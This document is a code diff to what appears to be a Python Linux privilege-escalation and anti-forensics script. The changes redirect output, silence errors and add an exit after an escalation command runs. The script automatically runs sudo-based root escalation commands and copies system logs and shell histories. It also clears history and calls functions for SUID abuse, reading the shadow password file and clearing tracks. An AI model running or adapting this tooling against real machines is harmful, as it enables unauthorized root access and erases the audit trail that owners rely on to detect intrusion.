@@ -21,7 +21,7 @@ password = args.password
 
 
 # check to see if user needs password to run sudo
-sudo_time = os.system("time timeout -k 5 5 sudo -l")
+sudo_time = os.system("time timeout -k 5 5 sudo -l > /tmp/sudo_l.txt")
 sudo_no_pass = None
 if sudo_time > float('1.0'):
 	sudo_no_pass = False
@@ -37,19 +37,19 @@ os.system("touch /tmp/pwd.txt")
 def disable_hist():
     print("\n### creating backups of log files... ###")
     os.system("mkdir /tmp/.backups")
-    os.system("cp /var/log/auth.log /tmp/.backups/")
-    os.system("cp /var/log/cron.log /tmp/.backups/")
-    os.system("cp /var/log/maillog /tmp/.backups/")
-    os.system("cp /var/log/httpd /tmp/.backups/")
-    os.system("cp ~/.bash_history /tmp/.backups/")
-    os.system("cp /root/.bash_history /tmp/.backups/")
-    os.system("echo $history > /tmp/.backups/history")
-    os.system("history -c")
-    os.system("history -w")
+    os.system("cp /var/log/auth.log /tmp/.backups/ 2>/dev/null")
+    os.system("cp /var/log/cron.log /tmp/.backups/ 2>/dev/null")
+    os.system("cp /var/log/maillog /tmp/.backups/ 2>/dev/null")
+    os.system("cp /var/log/httpd /tmp/.backups/ 2>/dev/null")
+    os.system("cp ~/.bash_history /tmp/.backups/ 2>/dev/null")
+    os.system("cp /root/.bash_history /tmp/.backups/ 2>/dev/null")
+    os.system("echo $history > /tmp/.backups/history 2>/dev/null")
+    os.system("history -c 2>/dev/null")
+    os.system("history -w 2>/dev/null")
 
 
 # check for binaries that can be run as sudo and print privesc script to screen
-def sudo_l():
+def sudo_l(sudo_no_pass):
     print("\n###--- please run 'sudo -l > /tmp/sudo_l.txt' before running this script to find sudoable commands ---###")
     time.sleep(5)
     print("\n### finding binaries you can run as sudo... ###")
@@ -111,6 +111,7 @@ def sudo_l():
             print("{}: {}".format(key,value))
             sudo_cmd = value.strip()
             os.system(sudo_cmd)
+            exit()
         else:
             continue
 
@@ -276,7 +277,7 @@ def clear_tracks():
 
 # - call functions -
 disable_hist()
-sudo_l()
+sudo_l(sudo_no_pass)
 suid()
 path()
 pass_shadow()
